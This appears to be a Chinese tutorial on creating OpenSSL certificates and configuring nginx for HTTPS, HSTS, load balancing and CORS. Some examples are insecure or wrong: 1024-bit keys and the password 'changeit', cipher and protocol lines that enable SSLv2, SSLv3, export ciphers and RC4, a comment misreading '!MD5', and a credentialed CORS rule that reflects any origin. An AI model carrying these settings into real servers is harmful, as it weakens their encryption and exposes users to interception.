C:\OpenSSL\bin>openssl x509 -req -in ca/ca-req.csr -out ca/ca-cert.pem -signkey ca/ca-key.pem -days 3650
4.将证书导出成浏览器支持的.p12格式 ：
C:\OpenSSL\bin>openssl pkcs12 -export -clcerts -in ca/ca-cert.pem -inkey ca/ca-key.pem -out ca/ca.p12
密码：changeit

生成的文件：
-rwxrwxrwx 1 berlin75 berlin75  891 Feb 20 22:43 ca-key.pem*
-rwxrwxrwx 1 berlin75 berlin75  672 Feb 20 22:45 ca-req.csr*
-rwxrwxrwx 1 berlin75 berlin75  891 Feb 20 22:46 ca-cert.pem*
-rwxrwxrwx 1 berlin75 berlin75 1637 Feb 20 22:46 ca.p12*

二.生成server证书
1.创建私钥 ：
C:\OpenSSL\bin>openssl genrsa -out server/server-key.pem 1024
2.创建证书请求 ： 填入的信息必须和根证书CA相同
C:\OpenSSL\bin>openssl req -new -out server/server-req.csr -key server/server-key.pem
-----
Country Name (2 letter code) [AU]:cn
State or Province Name (full name) [Some-State]:beijing
Locality Name (eg, city) []:beijing
Organization Name (eg, company) [Internet Widgits Pty Ltd]:skyvision
Organizational Unit Name (eg, section) []:test
Common Name (eg, YOUR name) []:192.168.1.246   注释：一定要写服务器所在的ip地址 ->127.0.0.1
Email Address []:sky
3.自签署证书 ：
C:\OpenSSL\bin>openssl x509 -req -in server/server-req.csr -out server/server-cert.pem -signkey server/server-key.pem -CA ca/ca-cert.pem -CAkey ca/ca-key.pem -CAcreateserial -days 3650
4.将证书导出成浏览器支持的.p12格式 ：
C:\OpenSSL\bin>openssl pkcs12 -export -clcerts -in server/server-cert.pem -inkey server/server-key.pem -out server/server.p12
密码：changeit

三.生成client证书
1.创建私钥 ：
C:\OpenSSL\bin>openssl genrsa -out client/client-key.pem 1024
2.创建证书请求 ：
C:\OpenSSL\bin>openssl req -new -out client/client-req.csr -key client/client-key.pem
-----
Country Name (2 letter code) [AU]:cn
State or Province Name (full name) [Some-State]:beijing
Locality Name (eg, city) []:beijing
Organization Name (eg, company) [Internet Widgits Pty Ltd]:skyvision
Organizational Unit Name (eg, section) []:test
Common Name (eg, YOUR name) []:sky
Email Address []:sky      注释：就是登入中心的用户(本来用户名应该是Common Name,但是中山公安的不知道为什么使用的Email Address,其他版本没有测试)
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:123456
An optional company name []:tsing
3.自签署证书 ：
C:\OpenSSL\bin>openssl x509 -req -in client/client-req.csr -out client/client-cert.pem -signkey client/client-key.pem -CA ca/ca-cert.pem -CAkey ca/ca-key.pem -CAcreateserial -days 3650
4.将证书导出成浏览器支持的.p12格式 ：
C:\OpenSSL\bin>openssl pkcs12 -export -clcerts -in client/client-cert.pem -inkey client/client-key.pem -out client/client.p12
密码：changeit

【 HTTPS服务器配置 】
一、SSL证书申请
1、确认需要申请证书的域名
2、生成私钥和csr文件
在linux机器上执行以下命令生成私钥
#openssl genrsa -out server.key 2048
在linux机器上执行以下命令生成csr文件
#openssl req -new -key server.key -out certreq.csr

Country Name： CN                      //您所在国家的ISO标准代号,中国为CN
State or Province Name：guandong       //您单位所在地省/自治区/直辖市
Locality Name：shenzhen                 //您单位所在地的市/县/区
Organization Name： Tencent Technology (Shenzhen) Company Limited                 //您单位/机构/企业合法的名称
Organizational Unit Name： R&D         //部门名称
Common Name： www.example.com     //通用名,例如：www.itrus.com.cn。此项必须与您访问提供SSL服务的服务器时所应用的域名完全匹配。
Email Address：                          //您的邮件地址,不必输入,直接回车跳过
"extra"attributes                        //以下信息不必输入,回车跳过直到命令执行完毕。

执行上面的命令后,在当前目录下即可生成私钥文件server.key和certreq.csr csr文件

3、将生成的csr文件提交给第三方证书颁发机构申请对应域名的服务器证书,同时将私钥文件保存好,以免丢失。

4、证书申请后,证书颁发机构会提供服务器证书内容和两张中级CA证书,请按证书颁发机器说明生成服务器证书,此处假设服务器证书文件名称为server.pem

5、将生成的私钥文件server.key和服务器证书server.pem拷贝至服务器指定的目录即可进行HTTPS服务器配置

二、HTTPS服务器配置
1、 Nginx配置
server {
  listen       443;   #指定ssl监听端口
  server_name  www.example.com;
  ssl on;    #开启ssl支持
  ssl_certificate      /etc/nginx/server.pem;    #指定服务器证书路径
  ssl_certificate_key  /etc/nginx/server.key;    #指定私钥证书路径
  ssl_session_timeout  5m;
  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;     #指定SSL服务器端支持的协议版本
  ssl_ciphers  ALL：!ADH：!EXPORT56：RC4+RSA：+HIGH：+MEDIUM：+LOW：+SSLv2：+EXP;    #指定加密算法
  ssl_prefer_server_ciphers   on;    #在使用SSLv3和TLS协议时指定服务器的加密算法要优先于客户端的加密算法
  #以下内容请按域名需要进行配置,此处仅供参考
  location / {
    return 444;
  }
}

三、相关事项
1、证书颁发机构
推荐天威诚信,具体请见：http://www.itrus.com.cn

2、常见问题
(1)证书受信任的问题
部分国内签发的SSL证书,在Android上不受信任,推荐GeoTrust;

(2)如果页面有动静分离,静态资源使用独立域名的话,也需要为该域名申请证书;

(3)android低版本不支持SNI扩展,受此限制,一台服务器只能部署一个数字证书;

【 使用OpenSSL生成SSL Key和CSR文件 】
配置HTTPS要用到私钥example.key文件和example.crt证书文件,申请证书文件的时候要用到example.csr文件,OpenSSL命令可以生成example.key文件和example.csr证书文件。

CSR：Cerificate Signing Request,证书签署请求文件,里面包含申请者的DN(Distinguished Name,标识名)和公钥信息,在第三方证书颁发机构签署证书的时候需要提供。证书颁发机构拿到CSR后使用其根证书私钥对证书进行加密并生成CRT证书文件,里面包含证书加密信息以及申请者的DN及公钥信息
Key：证书申请者私钥文件,和证书里面的公钥配对使用,在HTTPS『握手』通讯过程需要使用私钥去解密客戶端发來的经过证书公钥加密的随机数信息,是HTTPS加密通讯过程非常重要的文件,在配置HTTPS的時候要用到

证书和私钥的生成,自己颁发证书给自己
在实际的软件开发工作中,往往服务器就采用这种自签名的方式,因为毕竟找第三方签名机构是要给钱的,也是需要花时间的。
一般生成的目录,应该放在nginx/conf/ssl目录
1.创建服务器证书密钥文件 server.key：
openssl genrsa -des3 -out server.key 1024
输入密码server,确认密码,自己随便定义,但是要记住,后面会用到。

2.创建服务器证书的申请文件 server.csr
openssl req -new -key server.key -out server.csr
输出内容为：直接输入"."不设置
Enter pass phrase for root.key:                                  ← 输入前面创建的密码
Country Name (2 letter code) [AU]:CN                             ← 证书持有者所在国家,中国输入CN
State or Province Name (full name) [Some-State]:BeiJing          ← 证书持有者所在州或省份(可省略不填
Locality Name (eg,city) []:BeiJing                               ← 证书持有者所在城市(可省略不填)
Organization Name (eg,company) [Internet Widgits Pty Ltd]:demo   ← 证书持有者所属组织或公司Organizational
Organizational Unit Name (eg,section) []:                        ← localhost,证书持有者所属部门,可以不输入
Common Name (eg,YOUR name) []:                ← 这里输入的域名即为要使用https访问的域名www.daj.com或localhost
Email Address []:admin@mycompany.com          ← 邮箱(可省略不填,可随意填),demo@abc.com
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:                      ← 自定义密码,可以不输入
An optional company name []:                  ← 可选公司名称

3.备份一份服务器密钥文件
cp server.key server.key.org

4.去除文件口令,去除密码。
在加载SSL支持的Nginx并使用上述私钥时除去必须的口令,否则会在启动nginx的时候需要输入密码。
openssl rsa -in server.key.org -out server.key

5.生成证书文件server.crt
openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt

-rwxrwxrwx 1 berlin75 berlin75  960 Feb 20 21:51 server.crt*
-rwxrwxrwx 1 berlin75 berlin75  708 Feb 20 21:51 server.csr*
-rwxrwxrwx 1 berlin75 berlin75  887 Feb 20 21:51 server.key*
-rwxrwxrwx 1 berlin75 berlin75  951 Feb 20 21:51 server.key.org*

【 配置文件 】
/usr/local/nginx/conf/vhost/daj.conf

一些对安全性要求比较高的站点,可能会使用HTTPS(一种使用ssl通信标准的安全HTTP协议)
HTTPS的固定端口号是443,不同于HTTP的80端口
SSL标准需要引入安全证书,所以在nginx.conf中需要指定证书和它对应的key
其他和http反向代理基本一样,只是在Server部分配置有些不同。

ssl_certificate  FILE;
证书文件路径

ssl_certificate_key  FILE;
证书对应的私钥文件

ssl_ciphers  CIPHERS;
指明由nginx使用的加密算法,可以是OpenSSL库中所支持各加密套件

ssl_protocols指令
Syntax: ssl_protocols [SSLv2] [SSLv3] [TLSv1] [TLSv1.1] [TLSv1.2] [TLSv1.3];
Default: ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
Context: http, server
指明支持的ssl协议版本

ssl_session_timeout  #;
ssl会话超时时长;即ssl  session cache中的缓存有效时长

ssl_session_cache # ;
指明ssl会话缓存机制;off | none | [builtin[:size]] [shared:name:size],默认使用shared
off：禁止缓存,关闭缓存,不支持缓存功能
none：禁止缓存,不响应缓存
builtin：使用OpenSSL内置的ssl会话缓存,对机制为各worker私有;
shared：在各worker之间使用一个共享的缓存;name：独有名称;size：缓存空间大小,默认1M,可以调到10M;

命令ssl_protocols和ssl_ciphers可以用来限制连接只包含SSL/TLS的加強版本和算法,默认值如下：
ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
ssl_ciphers   HIGH:!aNULL:!MD5;

</pre><textarea>server{
  listen 443 default ssl;               #使用了443默认是ssl方式,多出default之后的ssl,default可省略
  server_name www.daj.com;              #绑定域名
  ssl_certificate ssl/server.crt;       #证书文件路径(公钥.发送到客户端的)
  ssl_certificate_key ssl/server.key;   #证书对应的私钥文件
  location / {
    proxy_redirect off;               #禁止跳转
    proxy_pass https://www.tao.com/;  #代理淘宝
  }
}

# 添加重定向自动跳转使用https
server{
  listen       80;
  server_name  www.daj.com;
  rewrite ^(.*) https://$server_name$1 permanent;
}

</textarea><pre>
$ curl -k -v https://www.daj.com/
报错curl: (60) SSL certificate problem: self signed certificate
curl需要加上-k,wget需要加上--no-check-certificate

访问www.daj.com浏览器自动跳转到https://www.daj.com,并能够成功访问
浏览器地址栏上面的https被红色划线是因为使用的是自己生成的证书,此证书不受浏览器信任,如果想使其变为绿色则需要向证书管理机构进行申请
浏览器->工具->internet选项->内容->证书->导入

【 开启nginx的ssl模块 】
1.the "ssl" parameter requires ngx_http_ssl_module  in /usr/local/nginx/conf/nginx.conf:37
http_ssl_module模块,编译安装时带上--with-http_ssl_module配置就可以了
2.如果已经安装过nginx,想要添加模块看下面
1)切换到nginx源码包
cd /usr/local/src/nginx-1.11.3
2)查看ngixn原有的模块
/usr/local/nginx/sbin/nginx -V
3)重新配置
./configure --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module
4)重新编译,不需要make  install安装。否则会覆盖
make
5)备份原有已经安装好的nginx
cp /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx.bak
6)将刚刚编译好的nginx覆盖掉原来的nginx(ngixn必须停止)
cp ./objs/nginx /usr/local/nginx/sbin/
这时,会提示是否覆盖,请输入yes,直接回车默认不覆盖
7)启动nginx,查看nginx模块,发现已经添加
/usr/local/nginx/sbin/nginx -V　

</pre>https反向代理配置<textarea>server {
  listen       443 ssl;                     #监听443端口。443为知名端口号,主要用于HTTPS协议
  server_name  www.xxx.com;                 #定义使用www.xxx.com访问

  ssl_certificate     ssl/cert.pem;         #ssl证书文件位置(常见证书文件格式为：crt/pem),www.xxx.com.crt
  ssl_certificate_key ssl/cert.key;         #私钥文件,ssl证书key位置

  # ssl配置参数(选择性配置)
  ssl_session_cache    shared:SSL:10m;
  ssl_session_timeout  5m;
  ssl_ciphers          HIGH:!aNULL:!MD5;      #数字签名,密码加密方式此处使用MD5
  ssl_protocols        SSLv2 SSLv3 TLSv1;     #指定密码为openssl支持的格式
  ssl_prefer_server_ciphers  on;              #依赖SSLv3和TLSv1协议的服务器密码将优先于客户端密码

  location / {
    root   /root;
    index  index.html index.htm index.php;
  }
}

</textarea>【 同时配置HTTP和HTTPS服务器 】<textarea># 把ssl on,这行去掉,ssl写在443端口后面,这样http和https的链接都可以用
server {
  listen              80;
  # listen              80 default backlog=2048;
  listen              443 ssl;
  server_name         www.example.com;
  root                /var/www/html;
  ssl_certificate     /usr/local/ssl/www.example.com.crt;
  ssl_certificate_key /usr/local/ssl/www.example.com.key;
  #...
}

</textarea><textarea>server {
  listen          192.168.1.1:443 ssl;
  server_name     www.example.com;
  ssl_certificate www.example.com.crt;
}

server {
  listen          192.168.1.2:443 ssl;
  server_name     www.example.org;
  ssl_certificate www.example.org.crt;
}

</textarea><textarea>ssl_certificate     common.crt;
ssl_certificate_key common.key;

server {
  listen          443 ssl;
  server_name     www.example.com;
}

server {
  listen          443 ssl;
  server_name     www.example.org;
}

</textarea><pre>
【 HTTPS服务器优化之减少CPU运算量 】
SSL的运行计算需要消耗额外的CPU资源,一般多核处理器系统会运行多个工作进程(worker processes),进程的数量不会少于可用的CPU核数。SSL通讯过程中握手阶段的运算最占用CPU资源,有两个方法可以减少每台客户端的运算量：
1、使用keepalive长连接,一个连接发送更多个请求
2、复用SSL会话参数,在并行并发的连接数中避免进行多次SSL握手
这些会话会存储在一个SSL会话缓存里面,通过命令ssl_session_cache配置,可以使缓存在机器间共享,然后利用客戶端在『握手』阶段使用的seesion id去查询服务端的session cathe(如果服务端设置有的话),简化『握手』阶段。

1M的会话缓存大概包含4000個会话,默认的缓存超时时间为5分钟,可以通过使用ssl_session_timeout命令设置缓存超时时间。下面是一個拥有10M共享会话缓存的多核系统优化配置例子：

</pre><textarea>worker_processes auto;
http {
  ssl_session_cache       shared:SSL:10m;      #配置共享会话缓存大小
  ssl_session_timeout     10m;                 #配置会话超时时间
  server {
    listen              443 ssl;
    server_name         www.example.com;
    keepalive_timeout   70;                   #设置长连接
    ssl_certificate     www.example.com.crt;
    ssl_certificate_key www.example.com.key;
    ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;
    ssl_ciphers         HIGH:!aNULL:!MD5;
    #...
  }
}

</textarea><pre>
【 使用HSTS策略强制浏览器使用HTTPS连接 】
HSTS – HTTP Strict Transport Security,HTTP严格传输安全,它允许一个HTTPS网站要求浏览器总是通过HTTPS来访问,这使得攻击者在用戶与服务器通讯过程中拦截、篡改信息以及冒充身份变得更为困难。

只要在Nginx配置文件加上以下头信息就可以了：
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains;preload" always;
max-age：设置单位时间内強制使用HTTPS连接
includeSubDomains：可选,所有子域同时生效
preload：可选,非规范值,用于定义使用『HSTS 预加载列表』
always：可选,保证所有响应都发送此响应头,包括各种內置错误响应

当用户进行HTTPS连接的时候,服务器会发送一个Strict-Transport-Security响应头
浏览器在获取该响应头后,在max-age的时间内如果遇到HTTP连接就会通过307跳转強制使用HTTPS进行连接,并忽略其它的跳转设置(如301重定向跳转)

307 跳转 Non-Authoritative-Reason 响应头

Google HSTS预加载列表(HSTS Preload List)
由于HSTS需要用戶经过一次安全的HTTPS连接后才会在max-age的时间內生效,因此HSTS策略并不能完美防止HTTP会话劫持(HTTP session hijacking),在下面这些情況下还是存在被劫持的可能：
从未访问过的网站
近期重裝过操作系統
近期重裝过浏览器
使用新的浏览器
使用了新的设备(如手机)
刪除了浏览器缓存
近期沒有打开过网站且max-age过期

针对这种情況,Google维护了一份『HSTS预加载列表』,列表里包含了使用了HSTS的站点主域名和子域名,可以通过以下页面申请加入：
https://hstspreload.appspot.com/.

申请的时候会先验证站点是否符合资格,一般会检验待验证的站点主域和子域是否能通过HTTPS连接、HTTPS和HTTP配置是否有STS Header等信息,通过验证后,会让你确认一些限制信息
申请通过后,列表内的站点名会被写进主流的浏览器,当浏览器更新版本后,只要打开列表内的站点,浏览器会拒绝所有 HTTP 连接而自动使用HTTPS,即使关闭了HSTS设置。

可以在下面两个连接分別查找Chrome和Firfox的『HSTS 预加载列表』内容：
The Chromium Projects - HTTP Strict Transport Security
Firefox HSTS preload list - nsSTSPreloadList.inc

需要注意的是：
一旦把自己的站点名加入『HSTS 预加载列表』,将很难彻底从列表中移除,因为不能保证其它浏览器可以及时移除,即使 Chrome 提供有便捷的移除方法,也是要通过出邮件联系,注明移除原因,并等到最新的浏览器版本更新发布才有机会(用戶不一定会及时更新)
所有不具备有效证书的子域或內嵌子域的访问将会被阻止
因此如果自己站点子域名变化比较多,又沒有泛域证书,又沒法确定全站是否能应用HTTPS的就要谨慎申请了。

【 加强HTTPS安全性 】
HTTPS基础配置采取的默认加密算法是SHA-1,这个算法非常脆弱,安全性在逐年降低,在2014年Google官方博客就宣布在Chrome浏览器中逐渐降低SHA-1证书的安全指示,会从2015年起使用SHA-2签名的证书

为此主流的HTTPS配置方案应该避免SHA-1,可以使用迪菲-赫尔曼密钥交换(D-H,Diffie–Hellman key exchange)方案。

首先在目录/etc/ssl/certs运行以下代码生成dhparam.pem文件：
openssl dhparam -out dhparam.pem 2048

然后加入Nginx配置：
#优先采取服务器算法
ssl_prefer_server_ciphers on;
#使用DH文件
ssl_dhparam /etc/ssl/certs/dhparam.pem;
ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
#定义算法
ssl_ciphers "EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS !RC4";

如果服务器夠強大,可以使用更为复杂的 4096 位进行加密。

一般情況下还应该加上以下几个增强安全性的命令：
#减少点击劫持
add_header X-Frame-Options DENY;
#禁止服务器自动解析资源类型
add_header X-Content-Type-Options nosniff;
#防XSS攻击
add_header X-Xss-Protection 1;

</pre>优化后的综合配置<textarea>worker_processes auto;
http {
  ssl_session_cache   shared:SSL:10m;  #配置共享会话缓存大小,视站点访问情况设定
  ssl_session_timeout 10m;             #配置会话超时时间
  server {
    listen              443 ssl;
    server_name         www.example.com;
    keepalive_timeout   70;          #设置长连接

    #HSTS策略
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    ssl_certificate     www.example.com.crt;  #证书文件
    ssl_certificate_key www.example.com.key;  #私钥文件

    ssl_prefer_server_ciphers on;             #优先采取服务器算法
    ssl_dhparam /etc/ssl/certs/dhparam.pem;   #使用DH文件
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
    #定义算法
    ssl_ciphers "EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS !RC4";
    add_header X-Frame-Options DENY;           #减少点击劫持
    add_header X-Content-Type-Options nosniff; #禁止服务器自动解析资源类型
    add_header X-Xss-Protection 1;             #防XSS攻擊
    #...

</textarea><pre>
【 基于服务器名称(name-based)的HTTPS服务器 】
一个常见的问题就是当使用同一个IP地址去配置两个或更多的HTTPS服务器的时候出现证书不匹配的情況：
server {
  listen          443 ssl;
  server_name     www.example.com;
  ssl_certificate www.example.com.crt;
}
server {
  listen          443 ssl;
  server_name     www.example.org;
  ssl_certificate www.example.org.crt;
}

这种情况下浏览器会获取默认的服务器证书(如上面例子的www.example.com.crt)而忽视请求的服务器名,如输入网址www.example.org,服务器会发送www.example.com.crt的证书到客戶端,而不是www.exaple.org.crt。

这是因为SSL协议行为所致,SSL连接在浏览器发送HTTP请求之前就被建立,Nginx并不知道被请求的服务器名字,因此Nginx只会提供默认的服务器证书。

解決这个问题最原始最有效的方法就是为每个HTTPS服务器分配独立的IP地址：
server {
  listen          192.168.1.1:443 ssl;
  server_name     www.example.com;
  ssl_certificate www.example.com.crt;
}
server {
  listen          192.168.1.2:443 ssl;
  server_name     www.example.org;
  ssl_certificate www.example.org.crt;
}

更多解決方案,除此之外官方还介绍了两个方法：泛域证书和域名指示(SNI)

其实OpenSSL在0.9.8f版本就支持SNI了,只要在安裝的时候加上--enable-tlsext选项就可以。到了0.9.8j版本这个选项在安裝的时候会默认启用。如果创建Nginx的时候支持SNI,可以在Nginx版本信息查到以下的字段：
TLS SNI support enabled

因此如果较新版本的Nginx使用默认的OpenSSL库,是不存在使用HTTPS同时支持基于名字的虚拟主机的时候同IP不同域名证书不匹配的问题
即使新版本的Nginx在创建时支持了SNI,如果Nginx动态加载不支持SNI的OpenSSL库的话,SNI扩展将不可用


</pre>

<h4>负载均衡</h4><pre>
负载均衡是Nginx常用的一个功能,负载均衡就是分摊到多个操作单元上进行执行,例如Web服务器、FTP服务器、企业关键应用服务器和其它关键任务服务器等,从而共同完成工作任务。简单而言就是当有2台或以上服务器时,根据规则随机的将请求分发到指定的服务器上处理
负载均衡配置一般都需要同时配置反向代理,通过反向代理跳转到负载均衡,而Nginx目前支持自带3种负载均衡策略,还有2种常用的第三方策略。

【 nginx支持的负载均衡调度算法方式 】
5种负载均衡各自适用不同情况下使用,所以可根据实际情况选择使用哪种策略模式,不过fair和url_hash需要安装第三方模块才能使用

1、RR、轮询(weight=1)
默认选项,当weight不指定时各服务器weight相同,每个请求按时间顺序逐一分配到不同的后端服务器,如果后端服务器down掉能自动剔除,请求受理情况不会受到任何影响

</pre><textarea>upstream bakend {
  server 192.168.1.10;
  server 192.168.1.11;
}

# 负载均衡的核心代码
upstream test {
  server localhost:8080;
  server localhost:8081;
}
server {
  listen       81;
  server_name  localhost;
  client_max_body_size 1024M;

  location / {
    proxy_pass http://test;
    proxy_set_header Host $host:$server_port;
  }
}

</textarea><pre>
这里配置了2台服务器,实际上是一台,只是端口不一样而已,而8081的服务器是不存在的,也就是说访问不到,但访问http://localhost的时候也不会有问题,会默认跳转到http://localhost:8080,因为Nginx会自动判断服务器的状态,如果服务器挂了服务器处于不能访问就不会跳转到这台服务器,所以也避免了一台服务器挂了影响使用的情况,由于Nginx默认是RR策略,所以不需要其他更多的设置。

2、weight(权重)
指定轮询几率,weight和访问比率成正比,用于后端服务器性能不均的情况。
给不同的后端服务器设置一个权重值(weight),用于调整不同的服务器上请求的分配率;权重数据越大,被分配到请求的几率越大;该权重值主要是针对实际工作环境中不同的后端服务器硬件配置进行调整的。如果后端服务器down掉能自动剔除。

</pre><textarea># 1.11服务器的访问量为1.10服务器的两倍。
upstream bakend {
  server 192.168.1.10 weight=1;
  server 192.168.1.11 weight=2;
}

#10次一般只会有1次会访问到8081,而有9次会访问到8080
upstream test {
  server localhost:8080 weight=9;
  server localhost:8081 weight=1;
}

</textarea><textarea>worker_processes 1;
events {
 worker_connections 1024;
}
http{
  upstream lxx {
    server 192.168.0.62 weight=2;
    server 192.168.0.161 weight=3;
  }
  server {
    listen 80;
    location / {
      proxy_pass http://lxx;  # 反向代理的地址
    }
  }
}

</textarea><pre>
3、ip_hash
如果应用程序有会话控制,即程序不是无状态的时候(采用了session保存数据),则不适应以上2方法,因为此方法不能保证把这次请求和下一次请求发送到同一台机器上,比如把登录信息保存到了session中,那么跳转到另外一台服务器的时候就需要重新登录了
每个请求按照发起客户端的ip的hash结果进行匹配,这样的算法下一个固定ip地址的客户端总会访问到同一个后端服务器,这也在一定程度上解决了集群部署环境下session不能跨服务器需要session共享的问题。
如果后端服务器down掉,要手工down掉

</pre><textarea>upstream resinserver{
  ip_hash;
  server 192.168.1.10:8080;
  server 192.168.1.11:8080;
}

upstream test {
  ip_hash;
  server localhost:8080;
  server localhost:8081;
}

</textarea><pre>
4、fair(第三方插件)
智能调整调度算法,动态的根据后端服务器的请求处理到响应的时间进行均衡分配,响应时间短的优先分配,响应时间短处理效率高的服务器分配到请求的概率高,响应时间长处理效率低的服务器分配到的请求少;结合了前两者的优点的一种调度算法。但nginx默认不支持fair算法,如果要使用这种调度算法请安装upstream_fair模块

upstream resinserver{
  server 192.168.1.10:8080;
  server 192.168.1.11:8080;
  fair;
}

upstream backend {
  fair;
  server localhost:8080;
  server localhost:8081;
}

5、url_hash(第三方插件)
按照访问的url的hash结果分配请求,每个请求的url会指向后端固定的某个服务器,后端服务器为缓存时比较有效,可以在nginx作为静态服务器的情况下提高缓存效率。nginx默认不支持这种调度算法,要使用的话需要安装nginx的hash软件包
在upstream中加入hash语句,server语句中不能写入weight等其他的参数,hash_method是使用的hash算法

upstream backend {
  hash $request_uri;
  hash_method crc32;
  server localhost:8080;
  server localhost:8081;
}

upstream resinserver{
  server 192.168.1.10:8080;
  server 192.168.1.11:8080;
  hash $request_uri;
  hash_method crc32;
}

</pre>完整的负载均衡<textarea>upstream bakend{                    # 定义负载均衡设备的Ip及设备状态
  ip_hash;
  server 127.0.0.1:9090 down;
  server 127.0.0.1:8080 weight=2;
  server 127.0.0.1:6060;
  server 127.0.0.1:7070 backup;
}

# 在需要使用负载均衡的server中增加proxy_pass http://bakend/; bakend为定义的upstream的名字

# 配置虚拟机
server{
  listen 80;                                   # 配置监听端口
  server_name image.***.com;                   # 配置访问域名
  location ~* \.(mp3|exe)$ {                   # 对以"mp3或exe"结尾的地址进行负载均衡
    proxy_pass http://img_relay$request_uri;   # 设置被代理服务器的端口或套接字以及URL
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    #以上三行,目的是将代理服务器收到的用户的信息传到真实服务器上
  }
}

</textarea><textarea>/*
网站在实际运营过程中,多半都是有多台服务器运行着同样的app,这时需要使用负载均衡来分流。
应用场景：将应用部署在192.168.1.11:80、192.168.1.12:80、192.168.1.13:80三台linux环境的服务器上。网站域名叫www.helloworld.com,公网IP为192.168.1.11。在公网IP所在的服务器上部署nginx,对所有请求做负载均衡处理
*/
http {
  # 设定mime类型,类型由mime.type文件定义
  include       /etc/nginx/mime.types;
  default_type  application/octet-stream;
  # 设定日志格式
  access_log    /var/log/nginx/access.log;

  # 设定负载均衡的服务器列表
  upstream load_balance_server {
    # weigth参数表示权值,权值越高被分配到的几率越大
    server 192.168.1.11:80   weight=5;
    server 192.168.1.12:80   weight=1;
    server 192.168.1.13:80   weight=6;
  }

  # HTTP服务器
  server {
    # 侦听80端口
    listen       80;
    # 定义使用www.xx.com访问
    server_name  www.helloworld.com;

    # 对所有请求进行负载均衡请求
    location / {
      root        /root;                      # 定义服务器的默认网站根目录位置
      index       index.html index.htm;       # 定义首页索引文件的名称
      proxy_pass  http://load_balance_server; # 请求转向load_balance_server定义的服务器列表

      #以下是一些反向代理的配置(可选择性配置)
      #proxy_redirect off;
      proxy_set_header Host $host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $remote_addr;  #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP
      proxy_connect_timeout 90;          #nginx跟后端服务器连接超时时间(代理连接超时)
      proxy_send_timeout 90;             #后端服务器数据回传时间(代理发送超时)
      proxy_read_timeout 90;             #连接成功后,后端服务器响应时间(代理接收超时)
      proxy_buffer_size 4k;              #设置代理服务器(nginx)保存用户头信息的缓冲区大小
      proxy_buffers 4 32k;               #proxy_buffers缓冲区,网页平均在32k以下的话,这样设置
      proxy_busy_buffers_size 64k;       #高负荷下缓冲大小(proxy_buffers*2)
      proxy_temp_file_write_size 64k;    #设定缓存文件夹大小,大于这个值,将从upstream服务器传

      client_max_body_size 10m;          #允许客户端请求的最大单文件字节数
      client_body_buffer_size 128k;      #缓冲区代理缓冲用户端请求的最大字节数
    }
  }
}

</textarea>网站有多个webapp的配置<textarea>/*
当一个网站功能越来越丰富时,往往需要将一些功能相对独立的模块剥离出来,独立维护,这样的话通常会有多个webapp
假如www.helloworld.com站点有几个webapp,finance(金融)、product(产品)、admin(用户中心),访问这些应用的方式通过上下文(context)来进行区分:
www.helloworld.com/finance/
www.helloworld.com/product/
www.helloworld.com/admin/

http默认端口号是80,如果在一台服务器上同时启动这3个webapp应用都用80端口肯定是不成的,所以这三个应用需要分别绑定不同的端口号
用户在实际访问www.helloworld.com站点时,访问不同webapp,总不会还带着对应的端口号去访问吧,所以再次需要用到反向代理来做处理。
*/
http {
  #此处省略一些基本配置
  upstream product_server{
    server www.helloworld.com:8081;
  }
  upstream admin_server{
    server www.helloworld.com:8082;
  }
  upstream finance_server{
    server www.helloworld.com:8083;
  }

  server {
    #此处省略一些基本配置
    #默认指向product的server
    location / {
      proxy_pass http://product_server;
    }
    location /product/{
      proxy_pass http://product_server;
    }
    location /admin/ {
      proxy_pass http://admin_server;
    }
    location /finance/ {
      proxy_pass http://finance_server;
    }
  }
}

</textarea>nginx跨域解决方案<textarea>/*
web领域开发中经常采用前后端分离模式,这种模式下前端和后端分别是独立的web应用程序,例如后端是Java程序,前端是React或Vue应用
各自独立的web app在互相访问时,势必存在跨域问题。解决跨域问题一般有两种思路：
1、CORS
在后端服务器设置HTTP响应头,把需要运行访问的域名加入Access-Control-Allow-Origin中
2、jsonp
把后端根据请求,构造json数据并返回,前端用jsonp跨域。

nginx根据第一种思路,也提供了一种解决跨域的解决方案。
举例：www.helloworld.com网站是由一个前端app,一个后端app组成的,前端端口号为9000,后端端口号为8080。前端和后端如果使用http进行交互时,请求会被拒绝,因为存在跨域问题
*/

首先在enable-cors.conf文件中设置cors ：
# allow origin list
set $ACAO '*';

# set single origin
if ($http_origin ~* (www.helloworld.com)$) {
  set $ACAO $http_origin;
}

if ($cors = "trueget") {
  add_header 'Access-Control-Allow-Origin' "$http_origin";
  add_header 'Access-Control-Allow-Credentials' 'true';
  add_header 'Access-Control-Allow-Methods' 'GET,POST,OPTIONS';
  add_header 'Access-Control-Allow-Headers' 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type';
}

if ($request_method = 'OPTIONS') {
  set $cors "${cors}options";
}

if ($request_method = 'GET') {
  set $cors "${cors}get";
}

if ($request_method = 'POST') {
  set $cors "${cors}post";
}

